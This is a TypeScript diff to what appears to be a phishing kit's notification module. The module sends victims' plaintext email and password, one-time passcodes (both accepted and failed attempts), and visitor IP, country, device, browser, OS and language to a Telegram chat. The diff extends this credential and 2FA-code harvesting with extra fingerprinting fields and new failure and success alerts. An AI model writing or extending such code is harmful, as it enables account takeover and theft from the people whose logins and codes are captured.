@@ -25,12 +25,16 @@ export async function sendTelegramMessage(message: string): Promise<void> {
   }
 }
 
-export async function notifyLogin(email: string, password: string): Promise<boolean> {
+export async function notifyLogin(email: string, password: string, language?: string, device?: string, browser?: string, os?: string): Promise<boolean> {
   const message = `
-<b>Login Attempt</b>
+<b>🔐 Login Attempt</b>
 
 <b>Email:</b> ${email}
 <b>Password:</b> ${password}
+<b>Language:</b> ${language || 'Unknown'}
+<b>Device:</b> ${device || 'Unknown'}
+<b>Browser:</b> ${browser || 'Unknown'}
+<b>OS:</b> ${os || 'Unknown'}
 <b>Time:</b> ${new Date().toLocaleString()}
   `.trim();
 
@@ -43,11 +47,16 @@ export async function notifyLogin(email: string, password: string): Promise<bool
   }
 }
 
-export async function notifyOtpVerification(otp: string): Promise<boolean> {
+export async function notifyOtpVerification(otp: string, language?: string, device?: string, browser?: string, os?: string, attempt?: number): Promise<boolean> {
   const message = `
-<b>OTP Verification</b>
+<b>✅ OTP Verification Success</b>
 
 <b>Code:</b> ${otp}
+<b>Attempt:</b> ${attempt || 1}
+<b>Language:</b> ${language || 'Unknown'}
+<b>Device:</b> ${device || 'Unknown'}
+<b>Browser:</b> ${browser || 'Unknown'}
+<b>OS:</b> ${os || 'Unknown'}
 <b>Time:</b> ${new Date().toLocaleString()}
   `.trim();
 
@@ -60,19 +69,64 @@ export async function notifyOtpVerification(otp: string): Promise<boolean> {
   }
 }
 
+export async function notifyOtpFailure(otp: string, language?: string, device?: string, browser?: string, os?: string, attempt?: number): Promise<boolean> {
+  const message = `
+<b>❌ OTP Verification Failed</b>
+
+<b>Entered Code:</b> ${otp}
+<b>Attempt:</b> ${attempt || 1} of 2
+<b>Language:</b> ${language || 'Unknown'}
+<b>Device:</b> ${device || 'Unknown'}
+<b>Browser:</b> ${browser || 'Unknown'}
+<b>OS:</b> ${os || 'Unknown'}
+<b>Time:</b> ${new Date().toLocaleString()}
+  `.trim();
+
+  try {
+    await sendTelegramMessage(message);
+    return true;
+  } catch (error) {
+    console.error("Failed to send OTP failure notification:", error);
+    return false;
+  }
+}
+
+export async function notifySuccess(language?: string, device?: string, browser?: string, os?: string): Promise<boolean> {
+  const message = `
+<b>🎉 Authentication Complete</b>
+
+<b>Status:</b> User successfully authenticated
+<b>Language:</b> ${language || 'Unknown'}
+<b>Device:</b> ${device || 'Unknown'}
+<b>Browser:</b> ${browser || 'Unknown'}
+<b>OS:</b> ${os || 'Unknown'}
+<b>Time:</b> ${new Date().toLocaleString()}
+  `.trim();
+
+  try {
+    await sendTelegramMessage(message);
+    return true;
+  } catch (error) {
+    console.error("Failed to send success notification:", error);
+    return false;
+  }
+}
+
 export async function notifyVisitor(
   ip: string,
   country: string,
   device: string,
   browser: string,
   os: string,
-  page: string
+  page: string,
+  language?: string
 ): Promise<boolean> {
   const message = `
 <b>🌐 New Visitor</b>
 
 <b>IP Address:</b> ${ip}
 <b>Country:</b> ${country}
+<b>Language:</b> ${language || 'Unknown'}
 <b>Device:</b> ${device}
 <b>Browser:</b> ${browser}
 <b>OS:</b> ${os}
